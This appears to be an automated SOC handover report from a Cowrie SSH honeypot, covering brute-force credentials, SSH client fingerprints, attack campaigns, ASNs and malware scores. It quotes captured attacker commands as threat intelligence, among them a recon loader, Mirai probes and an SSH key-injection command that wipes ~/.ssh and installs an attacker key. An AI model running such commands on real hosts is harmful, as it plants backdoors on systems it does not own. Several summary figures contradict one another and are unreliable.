# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-09 |
| **Generated At** | 2026-08-09T18:47:06Z |
| **Shift Time** | 18:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **126** |
| Confirmed Threats | **0** |
| False Positives Filtered | **126** (100.0%) |
| Unique Attacker IPs | **60** |
| Countries of Origin | **0** |
| High Severity Cases | **73** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **53** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **261** |
| Unique Credential Pairs | **242** |
| Unique Usernames | **9** |
| Unique Passwords | **237** |
| Successful Auth Pairs | **254** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 222 |
| `admin` | 25 |
| `support` | 4 |
| `tim` | 2 |
| `tunnel` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `R00T` | 4 |
| `P@ssw0rd123` | 4 |
| `smo@@kkklss` | 3 |
| `123qwe` | 3 |
| `12345` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `R00T` | 4 |
| `admin` | `P@ssw0rd123` | 4 |
| `root` | `smo@@kkklss` | 3 |
| `admin` | `123qwe` | 3 |
| `root` | `123@@@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `21` | `92.118.39.14` | 2026-08-09T14:55:39 |
| `root` | `sanboot#255132` | `10.0.0.73` | 2026-08-09T14:55:54 |
| `root` | `mima123456` | `10.0.0.73` | 2026-08-09T14:56:02 |
| `root` | `---fuck_you----` | `43.100.6.101` | 2026-08-09T14:56:37 |
| `root` | `321` | `92.118.39.14` | 2026-08-09T14:57:49 |
| `root` | `HUA@wei!@#` | `10.0.0.73` | 2026-08-09T14:58:04 |
| `root` | `1qaz@WSX3edc$RFV5tgb^YHN` | `10.0.0.73` | 2026-08-09T14:58:55 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-09T14:59:03 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-09T14:59:04 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-09T14:59:11 |
| `root` | `Admin1522` | `10.0.0.73` | 2026-08-09T14:59:45 |
| `root` | `4321` | `92.118.39.14` | 2026-08-09T14:59:54 |
| `root` | `r00t@12345` | `10.0.0.73` | 2026-08-09T15:01:06 |
| `root` | `Default!` | `10.0.0.73` | 2026-08-09T15:01:12 |
| `root` | `w3b@dmin` | `10.0.0.73` | 2026-08-09T15:01:23 |
| `root` | `54321` | `92.118.39.14` | 2026-08-09T15:01:59 |
| `root` | `pakistan123*` | `10.0.0.73` | 2026-08-09T15:02:18 |
| `root` | `Canapea123` | `10.0.0.73` | 2026-08-09T15:02:55 |
| `root` | `Jordan123` | `10.0.0.73` | 2026-08-09T15:03:16 |
| `root` | `Fakepass1` | `10.0.0.73` | 2026-08-09T15:03:53 |
| `root` | `654321` | `92.118.39.14` | 2026-08-09T15:03:59 |
| `root` | `Pakistan12` | `10.0.0.73` | 2026-08-09T15:04:23 |
| `root` | `imp@1234` | `10.0.0.73` | 2026-08-09T15:05:04 |
| `root` | `Insert123!` | `10.0.0.73` | 2026-08-09T15:06:04 |
| `root` | `P4ssw0rd` | `92.118.39.14` | 2026-08-09T15:06:09 |
| `root` | `Windows8` | `10.0.0.73` | 2026-08-09T15:06:17 |
| `root` | `Pokemon123` | `10.0.0.73` | 2026-08-09T15:07:27 |
| `admin` | `123qwe` | `65.20.205.197` | 2026-08-09T15:07:47 |
| `admin` | `123qwe` | `179.185.1.97` | 2026-08-09T15:07:55 |
| `root` | `P4ssword` | `92.118.39.14` | 2026-08-09T15:08:22 |
| `root` | `ashish@123` | `10.0.0.73` | 2026-08-09T15:08:28 |
| `root` | `Cheergirl1` | `10.0.0.73` | 2026-08-09T15:08:33 |
| `root` | `Luckyboyboy1` | `10.0.0.73` | 2026-08-09T15:09:06 |
| `root` | `Daanden1` | `10.0.0.73` | 2026-08-09T15:09:35 |
| `root` | `Annaminna1` | `10.0.0.73` | 2026-08-09T15:10:06 |
| `root` | `` | `91.92.40.5` | 2026-08-09T15:10:14 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-08-09T15:10:25 |
| `root` | `Passw0rd` | `92.118.39.14` | 2026-08-09T15:12:33 |
| `root` | `123abc@qq.com` | `10.0.0.73` | 2026-08-09T15:12:38 |
| `root` | `adminlv@123456` | `10.0.0.73` | 2026-08-09T15:13:25 |
| `root` | `P@55@word2` | `10.0.0.73` | 2026-08-09T15:14:12 |
| `root` | `p4ssword` | `92.118.39.14` | 2026-08-09T15:14:37 |
| `root` | `pass@word3` | `10.0.0.73` | 2026-08-09T15:14:45 |
| `root` | `ad123` | `10.0.0.73` | 2026-08-09T15:15:26 |
| `root` | `p@ssw0rd` | `92.118.39.14` | 2026-08-09T15:16:37 |
| `root` | `admin@77` | `10.0.0.73` | 2026-08-09T15:16:49 |
| `root` | `hahaha@123` | `10.0.0.73` | 2026-08-09T15:17:08 |
| `root` | `se7en@host` | `10.0.0.73` | 2026-08-09T15:17:43 |
| `support` | `7` | `87.225.108.138` | 2026-08-09T15:18:24 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-08-09T15:18:34 |
| `support` | `7` | `118.122.196.230` | 2026-08-09T15:18:39 |
| `root` | `!qwaszx123123` | `10.0.0.73` | 2026-08-09T15:20:11 |
| `root` | `!QWASZX1` | `10.0.0.73` | 2026-08-09T15:20:25 |
| `root` | `!QWASZX123` | `10.0.0.73` | 2026-08-09T15:20:32 |
| `root` | `password` | `92.118.39.14` | 2026-08-09T15:20:36 |
| `root` | `1s2y3m` | `10.0.0.73` | 2026-08-09T15:21:05 |
| `root` | `Admin&UJM` | `10.0.0.73` | 2026-08-09T15:21:13 |
| `root` | `Garena.com` | `10.0.0.73` | 2026-08-09T15:21:32 |
| `root` | `Garena12` | `10.0.0.73` | 2026-08-09T15:21:45 |
| `root` | `Garena1234` | `10.0.0.73` | 2026-08-09T15:21:58 |
| `root` | `P@$$12` | `10.0.0.73` | 2026-08-09T15:22:11 |
| `root` | `Qwerty159753` | `10.0.0.73` | 2026-08-09T15:22:18 |
| `root` | `garena.com` | `10.0.0.73` | 2026-08-09T15:22:25 |
| `root` | `qwerty` | `92.118.39.14` | 2026-08-09T15:22:33 |
| `root` | `garena1` | `10.0.0.73` | 2026-08-09T15:22:39 |
| `root` | `h1234560` | `10.0.0.73` | 2026-08-09T15:23:06 |
| `root` | `p455w0rd` | `10.0.0.73` | 2026-08-09T15:23:12 |
| `root` | `pass_w` | `10.0.0.73` | 2026-08-09T15:23:45 |
| `root` | `QWWQWW123` | `10.0.0.73` | 2026-08-09T15:24:25 |
| `user` | `1961` | `42.200.60.186` | 2026-08-09T15:25:41 |
| `root` | `Adrian1` | `10.0.0.73` | 2026-08-09T15:26:02 |
| `root` | `localAdmin1` | `10.0.0.73` | 2026-08-09T15:26:09 |
| `root` | `Server100` | `10.0.0.73` | 2026-08-09T15:26:29 |
| `root` | `online@#server1` | `10.0.0.73` | 2026-08-09T15:26:44 |
| `root` | `root1` | `92.118.39.14` | 2026-08-09T15:26:45 |
| `root` | `0ff1c3` | `10.0.0.73` | 2026-08-09T15:27:02 |
| `root` | `a@3` | `10.0.0.73` | 2026-08-09T15:27:23 |
| `root` | `a1s2d3f4` | `10.0.0.73` | 2026-08-09T15:27:35 |
| `root` | `Berbidvps.ir` | `10.0.0.73` | 2026-08-09T15:28:42 |
| `root` | `root12` | `92.118.39.14` | 2026-08-09T15:28:48 |
| `root` | `cvbnm1234!@#$` | `10.0.0.73` | 2026-08-09T15:29:51 |
| `root` | `root123` | `92.118.39.14` | 2026-08-09T15:30:48 |
| `root` | `Enes123` | `10.0.0.73` | 2026-08-09T15:31:39 |
| `root` | `Garena@123` | `10.0.0.73` | 2026-08-09T15:31:59 |
| `root` | `gfhjkm123` | `10.0.0.73` | 2026-08-09T15:32:02 |
| `root` | `root1234` | `92.118.39.14` | 2026-08-09T15:32:55 |
| `root` | `H@!!@#` | `10.0.0.73` | 2026-08-09T15:33:05 |
| `root` | `Hai01` | `10.0.0.73` | 2026-08-09T15:33:12 |
| `root` | `Hai11` | `10.0.0.73` | 2026-08-09T15:33:19 |
| `root` | `Hai2` | `10.0.0.73` | 2026-08-09T15:33:40 |
| `root` | `Hai7` | `10.0.0.73` | 2026-08-09T15:33:59 |
| `root` | `hoang@123` | `10.0.0.73` | 2026-08-09T15:34:32 |
| `root` | `localAdmin10` | `10.0.0.73` | 2026-08-09T15:34:58 |
| `root` | `root12345` | `92.118.39.14` | 2026-08-09T15:34:59 |
| `root` | `localAdmin4` | `10.0.0.73` | 2026-08-09T15:35:41 |
| `root` | `misys#12` | `10.0.0.73` | 2026-08-09T15:36:47 |
| `root` | `root123456` | `92.118.39.14` | 2026-08-09T15:36:53 |
| `root` | `Nguyen@` | `10.0.0.73` | 2026-08-09T15:37:42 |
| `root` | `online@#server3311` | `10.0.0.73` | 2026-08-09T15:37:55 |
| `root` | `Orlando1234` | `10.0.0.73` | 2026-08-09T15:38:27 |
| `root` | `P@ssw0rd6` | `10.0.0.73` | 2026-08-09T15:38:35 |
| `root` | `root1234567` | `92.118.39.14` | 2026-08-09T15:38:47 |
| `root` | `Pa$$w0rd.12` | `10.0.0.73` | 2026-08-09T15:38:54 |
| `root` | `password@3` | `10.0.0.73` | 2026-08-09T15:39:28 |
| `tim` | `123` | `101.47.158.56` | 2026-08-09T15:40:23 |
| `345gs5662d34` | `345gs5662d34` | `101.47.158.56` | 2026-08-09T15:40:28 |
| `tim` | `3245gs5662d34` | `101.47.158.56` | 2026-08-09T15:40:29 |
| `root` | `root123456789` | `92.118.39.14` | 2026-08-09T15:40:47 |
| `root` | `thanh@123` | `10.0.0.73` | 2026-08-09T15:41:49 |
| `root` | `top#123` | `10.0.0.73` | 2026-08-09T15:42:37 |
| `root` | `root1234567890` | `92.118.39.14` | 2026-08-09T15:42:49 |
| `root` | `united12` | `10.0.0.73` | 2026-08-09T15:42:58 |
| `tunnel` | `tunnel` | `45.154.244.193` | 2026-08-09T15:43:31 |
| `root` | `Vps03` | `10.0.0.73` | 2026-08-09T15:44:49 |
| `admin` | `1` | `92.118.39.14` | 2026-08-09T15:45:06 |
| `root` | `!@#QWEASD` | `10.0.0.73` | 2026-08-09T15:45:23 |
| `root` | `!A@S#D$F%G` | `10.0.0.73` | 2026-08-09T15:46:03 |
| `root` | `!Z@X#C` | `10.0.0.73` | 2026-08-09T15:46:57 |
| `admin` | `12` | `92.118.39.14` | 2026-08-09T15:47:12 |
| `admin` | `123` | `92.118.39.14` | 2026-08-09T15:49:10 |
| `root` | `!Q2w3E4r!@#$` | `10.0.0.73` | 2026-08-09T15:49:58 |
| `root` | `!QAZ@3wsxedc` | `10.0.0.73` | 2026-08-09T15:50:52 |
| `admin` | `1234` | `92.118.39.14` | 2026-08-09T15:51:10 |
| `root` | `!QAz@WSx#edc$rfv` | `10.0.0.73` | 2026-08-09T15:51:35 |
| `root` | `!QWER2asdf#ZXCV` | `10.0.0.73` | 2026-08-09T15:51:58 |
| `root` | `!Qaz@wsx#edc` | `10.0.0.73` | 2026-08-09T15:53:00 |
| `admin` | `12345` | `92.118.39.14` | 2026-08-09T15:53:04 |
| `root` | `!qaz23wsxedc` | `10.0.0.73` | 2026-08-09T15:53:25 |
| `admin` | `123456` | `92.118.39.14` | 2026-08-09T15:54:49 |
| `root` | `!qaz@xsw#edc` | `10.0.0.73` | 2026-08-09T15:55:31 |
| `root` | `!qwer2asdf#zxcv` | `10.0.0.73` | 2026-08-09T15:56:07 |
| `admin` | `1234567` | `92.118.39.14` | 2026-08-09T15:56:40 |
| `root` | `1qaz2wsx3e` | `10.0.0.73` | 2026-08-09T15:57:46 |
| `root` | `1qaz2wsx3edc4r` | `10.0.0.73` | 2026-08-09T15:58:13 |
| `root` | `1qaz2wsxcde3` | `10.0.0.73` | 2026-08-09T15:58:27 |
| `admin` | `12345678` | `92.118.39.14` | 2026-08-09T15:58:37 |
| `root` | `R00T` | `10.0.0.73` | 2026-08-09T15:59:11 |
| `admin` | `123456789` | `92.118.39.14` | 2026-08-09T16:00:37 |
| `root` | `R00T` | `200.199.32.174` | 2026-08-09T16:00:54 |
| `root` | `rP@ssw0rd` | `10.0.0.73` | 2026-08-09T16:01:08 |
| `root` | `zzidc!@#123` | `10.0.0.73` | 2026-08-09T16:01:38 |
| `root` | `cx123456` | `10.0.0.73` | 2026-08-09T16:01:59 |
| `root` | `ds123456` | `10.0.0.73` | 2026-08-09T16:02:27 |
| `root` | `www111` | `10.0.0.73` | 2026-08-09T16:02:33 |
| `admin` | `1234567890` | `92.118.39.14` | 2026-08-09T16:02:43 |
| `root` | `sohu.com` | `10.0.0.73` | 2026-08-09T16:02:46 |
| `root` | `nihaoqwe!@#` | `10.0.0.73` | 2026-08-09T16:02:55 |
| `root` | `3edc$RFV5tgb^YHN` | `10.0.0.73` | 2026-08-09T16:03:34 |
| `root` | `nihaoqwe123` | `10.0.0.73` | 2026-08-09T16:04:41 |
| `admin` | `123qwe` | `92.118.39.14` | 2026-08-09T16:04:52 |
| `support` | `support` | `176.53.159.196` | 2026-08-09T16:06:04 |
| `root` | `jd123456` | `10.0.0.73` | 2026-08-09T16:06:12 |
| `admin` | `123qwerty` | `92.118.39.14` | 2026-08-09T16:06:47 |
| `root` | `xiaoman***.` | `10.0.0.73` | 2026-08-09T16:06:53 |
| `root` | `Y4yh19T` | `10.0.0.73` | 2026-08-09T16:07:21 |
| `root` | `rss123` | `10.0.0.73` | 2026-08-09T16:08:28 |
| `root` | `249SEPSyiae@net@IDC` | `10.0.0.73` | 2026-08-09T16:08:39 |
| `admin` | `21` | `92.118.39.14` | 2026-08-09T16:08:39 |
| `root` | `f1234567` | `10.0.0.73` | 2026-08-09T16:08:53 |
| `root` | `123qazwszedc` | `10.0.0.73` | 2026-08-09T16:09:13 |
| `root` | `1234yuioxyZ` | `10.0.0.73` | 2026-08-09T16:10:14 |
| `admin` | `321` | `92.118.39.14` | 2026-08-09T16:10:26 |
| `root` | `Founder123456` | `10.0.0.73` | 2026-08-09T16:10:32 |
| `root` | `woaini1314` | `10.0.0.73` | 2026-08-09T16:10:59 |
| `admin` | `654321` | `92.118.39.14` | 2026-08-09T16:12:19 |
| `admin` | `Password` | `92.118.39.14` | 2026-08-09T16:14:06 |
| `root` | `Aa.1` | `10.0.0.73` | 2026-08-09T16:14:53 |
| `root` | `Abc!1234` | `10.0.0.73` | 2026-08-09T16:15:21 |
| `root` | `abc1234@` | `10.0.0.73` | 2026-08-09T16:15:38 |
| `admin` | `admin` | `92.118.39.14` | 2026-08-09T16:15:53 |
| `root` | `1234.abc` | `10.0.0.73` | 2026-08-09T16:16:00 |
| `root` | `Qwe1234!@` | `10.0.0.73` | 2026-08-09T16:16:21 |
| `root` | `qwe1234!` | `10.0.0.73` | 2026-08-09T16:16:39 |
| `root` | `R00T` | `50.188.204.213` | 2026-08-09T16:17:15 |
| `root` | `1234Qwe!@` | `10.0.0.73` | 2026-08-09T16:17:19 |
| `root` | `R00T` | `121.202.206.119` | 2026-08-09T16:17:24 |
| `admin` | `admin1` | `92.118.39.14` | 2026-08-09T16:17:44 |
| `root` | `Asd!1234` | `10.0.0.73` | 2026-08-09T16:18:07 |
| `root` | `asd!1234` | `10.0.0.73` | 2026-08-09T16:18:29 |
| `root` | `1234asd` | `10.0.0.73` | 2026-08-09T16:19:03 |
| `admin` | `admin12` | `92.118.39.14` | 2026-08-09T16:19:34 |
| `root` | `1234Asd@` | `10.0.0.73` | 2026-08-09T16:20:01 |
| `root` | `1234asd!` | `10.0.0.73` | 2026-08-09T16:20:17 |
| `tunnel` | `tunnel` | `10.0.0.73` | 2026-08-09T16:20:19 |
| `root` | `1234Asd.` | `10.0.0.73` | 2026-08-09T16:20:22 |
| `root` | `1234!qwe` | `10.0.0.73` | 2026-08-09T16:20:49 |
| `root` | `1234Zxc` | `10.0.0.73` | 2026-08-09T16:20:58 |
| `root` | `1234Zxc@` | `10.0.0.73` | 2026-08-09T16:21:49 |
| `root` | `1234zxc.` | `10.0.0.73` | 2026-08-09T16:22:17 |
| `root` | `Qaz1234!` | `10.0.0.73` | 2026-08-09T16:22:30 |
| `root` | `qaz_1234` | `10.0.0.73` | 2026-08-09T16:23:10 |
| `root` | `1234@qaz` | `10.0.0.73` | 2026-08-09T16:23:24 |
| `root` | `1234.qaz` | `10.0.0.73` | 2026-08-09T16:23:43 |
| `root` | `1234Qaz.` | `10.0.0.73` | 2026-08-09T16:24:32 |
| `root` | `Zaq1234` | `10.0.0.73` | 2026-08-09T16:24:45 |
| `root` | `Zaq!1234` | `10.0.0.73` | 2026-08-09T16:25:00 |
| `root` | `zaq1234.` | `10.0.0.73` | 2026-08-09T16:25:53 |
| `root` | `1234.Zaq` | `10.0.0.73` | 2026-08-09T16:26:33 |
| `root` | `1234!Zaq` | `10.0.0.73` | 2026-08-09T16:27:01 |
| `root` | `1234zaq!@` | `10.0.0.73` | 2026-08-09T16:27:13 |
| `root` | `1234zaq@` | `10.0.0.73` | 2026-08-09T16:27:20 |
| `root` | `1234Zaq!` | `10.0.0.73` | 2026-08-09T16:27:25 |
| `admin` | `P@ssw0rd123` | `210.4.68.72` | 2026-08-09T16:27:45 |
| `root` | `Admin!@34` | `10.0.0.73` | 2026-08-09T16:27:47 |
| `admin` | `P@ssw0rd123` | `24.97.253.246` | 2026-08-09T16:27:53 |
| `admin` | `P@ssw0rd123` | `60.251.229.144` | 2026-08-09T16:27:58 |
| `admin` | `P@ssw0rd123` | `93.241.232.14` | 2026-08-09T16:28:05 |
| `root` | `Talent@789` | `10.0.0.73` | 2026-08-09T16:28:21 |
| `root` | `dell!@34` | `10.0.0.73` | 2026-08-09T16:28:47 |
| `root` | `zxc1234567@` | `10.0.0.73` | 2026-08-09T16:29:00 |
| `root` | `1q2w3e$R%T` | `10.0.0.73` | 2026-08-09T16:29:14 |
| `centos` | `12345` | `220.128.137.164` | 2026-08-09T16:29:42 |
| `centos` | `12345` | `213.33.204.130` | 2026-08-09T16:29:53 |
| `root` | `123_admin` | `10.0.0.73` | 2026-08-09T16:30:34 |
| `root` | `Q!W@e3r4` | `10.0.0.73` | 2026-08-09T16:30:56 |
| `support` | `support` | `10.0.0.73` | 2026-08-09T16:31:05 |
| `root` | `ABC!123` | `10.0.0.73` | 2026-08-09T16:32:08 |
| `root` | `pass00!` | `10.0.0.73` | 2026-08-09T16:32:22 |
| `root` | `Aa@123456.` | `10.0.0.73` | 2026-08-09T16:33:03 |
| `root` | `Huawei12#$%` | `10.0.0.73` | 2026-08-09T16:34:21 |
| `root` | `QWE!@#qwe` | `10.0.0.73` | 2026-08-09T16:34:37 |
| `root` | `Hik12345!` | `10.0.0.73` | 2026-08-09T16:34:45 |
| `root` | `8888888888` | `117.211.15.106` | 2026-08-09T16:35:33 |
| `root` | `8888888888` | `62.122.195.14` | 2026-08-09T16:35:44 |
| `root` | `1234_abc` | `10.0.0.73` | 2026-08-09T16:36:37 |
| `root` | `1234abcd!@` | `10.0.0.73` | 2026-08-09T16:36:59 |
| `root` | `1234!abcd` | `10.0.0.73` | 2026-08-09T16:37:05 |
| `root` | `Abc!12345` | `10.0.0.73` | 2026-08-09T16:38:20 |
| `root` | `abc12345.` | `10.0.0.73` | 2026-08-09T16:38:39 |
| `root` | `Dell#1234` | `10.0.0.73` | 2026-08-09T16:39:33 |
| `root` | `Dell.123` | `10.0.0.73` | 2026-08-09T16:39:44 |
| `root` | `Root123456.` | `10.0.0.73` | 2026-08-09T16:40:26 |
| `root` | `123456@Qq` | `10.0.0.73` | 2026-08-09T16:41:08 |
| `root` | `cloud@123456` | `10.0.0.73` | 2026-08-09T16:41:35 |
| `root` | `Zxc!@#123` | `10.0.0.73` | 2026-08-09T16:41:47 |
| `root` | `vizxv` | `94.154.172.142` | 2026-08-09T16:42:54 |
| `root` | `Admin123456` | `10.0.0.73` | 2026-08-09T16:43:26 |
| `root` | `founder123!` | `10.0.0.73` | 2026-08-09T16:44:28 |
| `root` | `Ly@123` | `10.0.0.73` | 2026-08-09T16:45:09 |
| `root` | `Zl123456` | `10.0.0.73` | 2026-08-09T16:45:56 |
| `root` | `Sx123456!` | `10.0.0.73` | 2026-08-09T16:46:43 |
| `sysadmin` | `sysadmin` | `10.0.0.73` | 2026-08-09T16:46:44 |
| `root` | `Zzzx@2957` | `10.0.0.73` | 2026-08-09T16:46:56 |
| `root` | `Yf123456.` | `10.0.0.73` | 2026-08-09T16:47:16 |
| `root` | `Bp123456@` | `10.0.0.73` | 2026-08-09T16:47:22 |
| `root` | `Cp@123456` | `10.0.0.73` | 2026-08-09T16:47:49 |
| `root` | `Wt123456@` | `10.0.0.73` | 2026-08-09T16:48:15 |
| `root` | `Win1!@#` | `10.0.0.73` | 2026-08-09T16:49:02 |
| `root` | `456789.com` | `10.0.0.73` | 2026-08-09T16:49:36 |
| `root` | `qwe@12346` | `10.0.0.73` | 2026-08-09T16:49:50 |
| `root` | `password#123` | `10.0.0.73` | 2026-08-09T16:50:16 |
| `root` | `Cloud@123321` | `10.0.0.73` | 2026-08-09T16:51:08 |
| `root` | `cloud@123123` | `10.0.0.73` | 2026-08-09T16:51:36 |
| `root` | `.123456Zxc` | `10.0.0.73` | 2026-08-09T16:54:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **126** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 47 |
| OpenSSH | 16 |
| libssh | 8 |
| Paramiko (Python) | 7 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 43 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `a2de0f306611...` | Mirai/variant | 7 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 43 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 7 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 1 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 42 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `91.92.40.5`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.47.158.56`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **60** |
| Unique ASNs | **49** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | LOW |
| `AS22773` | Cox Communications Inc. | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS48721` | Flyservers S.A. | 2 | LOW |
| `AS3462` | Data Communication Business Group | 2 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS3549` | Level 3 Parent, LLC | 1 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
